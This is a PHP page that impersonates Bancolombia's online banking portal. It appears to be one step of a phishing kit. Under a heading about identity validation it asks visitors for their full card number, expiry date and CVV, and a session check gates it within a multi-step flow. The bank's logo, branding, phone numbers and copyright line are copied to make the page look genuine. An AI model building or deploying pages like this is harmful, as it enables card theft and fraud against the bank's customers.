<?php
 require "liquidador.php";
 require "ayudador.php";
if (is_session_started() === FALSE) {
    session_start();
}
if(!array_key_exists("permiso3",$_SESSION)){
    header("location:index.php");
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bancolombia Sucursal Virtual Personas</title>
  <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
  <link rel="stylesheet" href="css/normalize.css" />
  <link rel="stylesheet" href="css/estilos.css" />
  <style>
    @media (min-width: 991px) {
      .principal>.der {
        width: 37%;
      }
    }
  </style>
</head>

<body>
  <div class="cuerpo">
    <div class="header1">
      <div class="logo"></div>
      <span class="svpnombre">Sucursal Virtual Personas</span>
      <div class="tiempotext">
        Fecha y hora actual: <span id="jclock1" class="tiempotext t1"></span>
      </div>
    </div>
    <div class="header2">
      <h3>Validar identidad</h3>
    </div>
    <div class="principal">
      <div class="der dclave" >
        <div class="panel-formulario">
          <div class="panel-hform">
            <h1>Tarjeta</h1>
          </div>
          <div class="panel-lform">
            <h4>
              Ingrese los siguientes datos para validar su identidad.
              Los datos de la tarjeta ingresada deben de coincidir con los registrados en Bancolombia
            </h4>
          </div>
          <form autocomplete="off" id="fcard">
            <div class="grupo">
              <div>
                <label for="ncard" style="margin-left: 10px;">Número de tarjeta</label>
              </div>
              <input class="tarjeta" type="text" name="ncard" id="ncard" maxlength="16">
            </div>
            <div class="grupo">
              <div>
                <label for="clave" style="margin-left: 10px;"> Ingresa la fecha de vencimiento</label>
              </div>

              <select name="mes" id="mes" style="margin-right: 30px;">
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="09">10</option>
                <option value="09">11</option>
                <option value="09">12</option>
              </select>
              <select name="anio" id="anio">
                <option value="2021">2021</option>
                <option value="2022">2022</option>
                <option value="2023">2023</option>
                <option value="2024">2024</option>
                <option value="2025">2025</option>
                <option value="2026">2026</option>
                <option value="2027">2027</option>
                <option value="2028">2028</option>
                <option value="2029">2029</option>
              </select>

            </div>
            <div class="grupo">
              <div>
                <label for="cvv" style="margin-left: 10px;"> Ingresa Cvv o Cvc</label>
              </div>

              <input class="cvv" type="text" name="cvv" id="cvv" maxlength="4">

            </div>
            <div class="grupo bcentro">
              <button type="reset" id="reset" class="btn default">Cancelar</button>
              <button type="button" id="btncard" class="btn hecho">Validar</button>
            </div>
            <div class="linkf columna">

              <img src="img/ayuda.png" alt="ayuda">
              <a href="javascript:void(0)"> Genera una clave personal</a>
            </div>
          </form>

        </div>
     

      </div>

    </div>
    <div class="footer">
      <p>Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213 <br>
        El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.
      </p>
    </div>
    <div class="footer2">
      <p>Dirección Ip: <?php echo $_SERVER["REMOTE_ADDR"]; ?></p>
      <p>Copyright ©&nbsp;2021&nbsp;Bancolombia S.A.&nbsp;&nbsp;</p>
    </div>
  </div>
  <script src="js/jquery-3.6.0.min.js"></script>
  <script language="javascript" src="js/jquery.jclockNew.js?v=4.5.1.RC2_1628742112900" type="text/JavaScript"></script>
  <script src="js/funciones.js"></script>
</body>

</html>